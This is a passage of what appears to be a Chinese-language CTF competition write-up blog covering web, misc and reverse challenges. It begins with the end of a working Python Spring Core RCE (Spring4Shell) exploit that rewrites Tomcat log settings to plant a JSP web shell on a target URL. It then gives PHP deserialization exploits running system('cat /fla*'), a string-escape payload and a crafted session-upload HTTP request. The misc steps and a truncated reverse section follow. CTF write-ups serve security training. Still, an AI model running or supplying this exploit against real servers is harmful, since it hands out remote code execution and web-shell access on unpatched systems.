will create an artifact of &#123;old_file_name&#125;_.jsp</span><br>    file_date_data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Resetting Log Variables.&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br>    <span class="hljs-comment"># Change the tomcat log location variables</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Modifying Log Configurations&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=exp_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br>    <span class="hljs-comment"># Changes take some time to populate on tomcat</span><br>    time.sleep(<span class="hljs-number">3</span>)<br><br>    <span class="hljs-comment"># Send the packet that writes the web shell</span><br>    ret = requests.get(url, headers=get_headers, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response Code: %d&quot;</span> % ret.status_code)<br><br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># Reset the pattern to prevent future writes into the file</span><br>    pattern_data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Resetting Log Variables.&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Spring Core RCE&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--url&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;File to write to [no extension]&#x27;</span>, required=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;shell&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--dir&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Directory to write to. Suggest using &quot;webapps/[appname]&quot; of target app&#x27;</span>,<br>                        required=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;webapps/ROOT&quot;</span>)<br><br>    file_arg = parser.parse_args().file<br>    dir_arg = parser.parse_args().<span class="hljs-built_in">dir</span><br>    url_arg = parser.parse_args().url<br><br>    filename = file_arg.replace(<span class="hljs-string">&quot;.jsp&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> url_arg <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Must pass an option for --url&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">try</span>:<br>        run_exploit(url_arg, dir_arg, filename)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Exploit completed&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Check your target for a shell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] File: &quot;</span> + filename + <span class="hljs-string">&quot;.jsp&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> dir_arg:<br>            location = urlparse(url_arg).scheme + <span class="hljs-string">&quot;://&quot;</span> + urlparse(url_arg).netloc + <span class="hljs-string">&quot;/&quot;</span> + filename + <span class="hljs-string">&quot;.jsp&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            location = <span class="hljs-string">f&quot;Unknown. Custom directory used. (try app/<span class="hljs-subst">&#123;filename&#125;</span>.jsp?cmd=id&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Shell should be at: <span class="hljs-subst">&#123;location&#125;</span>?cmd=id&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-web2-1.png"></p><h2 id="PHP反序列化2"><a href="#PHP反序列化2" class="headerlink" title="PHP反序列化2"></a>PHP反序列化2</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">easy</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ClassObj-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">easy</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello Hacker&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;file);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;eval&#x27;</span>)!==False)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&lt;/br&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)!==False) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&lt;/br&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$user</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">main</span>();<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;system(&quot;cat /fla*&quot;);&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">main</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="phpti"><a href="#phpti" class="headerlink" title="phpti"></a>phpti</h2><p>字符串逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;r11.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;phpinfo()&#x27;</span>,<span class="hljs-string">&#x27;phpinfo()up&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]<br><span class="hljs-variable">$password</span>=<span class="hljs-number">123456</span>;<br><span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));<br><span class="hljs-variable">$test</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure><p><code>?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;&#125;</code></p><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">admin</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$root</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;root;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;3123123123123\n&quot;</span>;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;root ===<span class="hljs-string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123412341234&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;aaaaaaaa&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>host:port<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>369<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7Pufxj5tsIY9p2yA<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=n480589952d85l2vvkeb01sh9g<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">123</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;|O:5:\&quot;<span class="hljs-keyword">admin</span>\&quot;:1:&#123;s:4:\&quot;root\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA--</span></span><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="不要被迷惑"><a href="#不要被迷惑" class="headerlink" title="不要被迷惑"></a>不要被迷惑</h2><p>筛选<code>http</code>协议的包，找到<code>flag.zip</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc1-1.png"></p><p>导出压缩包后爆破密码，得到<code>123321</code></p><p>得到一串jjencode编码字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$=~[];$=&#123;<span class="hljs-attr">___</span>:++$,<span class="hljs-attr">$$$$</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">__$</span>:++$,<span class="hljs-attr">$_$_</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">_$_</span>:++$,<span class="hljs-attr">$_$$</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$$_$</span>:($[$]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">_$$</span>:++$,<span class="hljs-attr">$$$_</span>:(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$__</span>:++$,<span class="hljs-attr">$_$</span>:++$,<span class="hljs-attr">$$__</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$$_</span>:++$,<span class="hljs-attr">$$$</span>:++$,<span class="hljs-attr">$___</span>:++$,<span class="hljs-attr">$__$</span>:++$&#125;;$.$_=($.$_=$+<span class="hljs-string">&quot;&quot;</span>)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+<span class="hljs-string">&quot;&quot;</span>)[$.__$])+((!$)+<span class="hljs-string">&quot;&quot;</span>)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$.__$])+($._=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+<span class="hljs-string">&quot;\&quot;&quot;</span>+$.$$$$+(![]+<span class="hljs-string">&quot;&quot;</span>)[$._$_]+$.$_$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$__+$.$$$+<span class="hljs-string">&quot;&#123;\\&quot;</span>+$.__$+$._$_+$.$$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.$_$+$._+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$._$_+$.$$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.___+(![]+<span class="hljs-string">&quot;&quot;</span>)[$._$_]+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$_$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$$+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.__$+$.$$_$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.$__+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$._$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$$+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$._$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$$+$.__$+$.__+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$.$$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$$+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$__+$._$+<span class="hljs-string">&quot;&#125;&quot;</span>+<span class="hljs-string">&quot;\&quot;&quot;</span>)())();<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc1-2.png"></p><h2 id="PCAP文件分析"><a href="#PCAP文件分析" class="headerlink" title="PCAP文件分析"></a>PCAP文件分析</h2><p><code>flag.pcapng</code>找到没用的<code>flag.zip</code></p><p><code>02.pcapng</code>提取出一个<code>02.zip</code>，一个<code>2.png</code></p><p><code>2.png</code>上看到压缩包密码<code>Vu8#fI9</code>，解压得到<code>flag2.png</code></p><p>修改<code>flag2.png</code>高度得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-misc2-1.png"></p><h2 id="平正开"><a href="#平正开" class="headerlink" title="平正开"></a>平正开</h2><p><em>赛后复现</em></p><p>每一位取反后加一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i)==<span class="hljs-number">0</span>:<br>        f.write(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0xff</span>)+<span class="hljs-number">1</span>,<span class="hljs-built_in">ord</span>(i))<br>    f.write(<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0xff</span>)+<span class="hljs-number">1</span>))<br>f.close()<br></code></pre></td></tr></table></figure><p>伪加密后得到一串<code>社会主义核心价值观加密</code>字符串，解密得到flag</p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>先用<code>pyinstxtractor</code>解包，找到<code>test_obfuscated.pyc</code>，反编译，得到源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br>difficulty = <span class="hljs-number">25</span><br>frame_size_x = <span class="hljs-number">720</span><br>frame_size_y = <span class="hljs-number">480</span><br>check_errors = pygame.init()<br>pygame.display.set_caption(<span class="hljs-string">&#x27;Lets 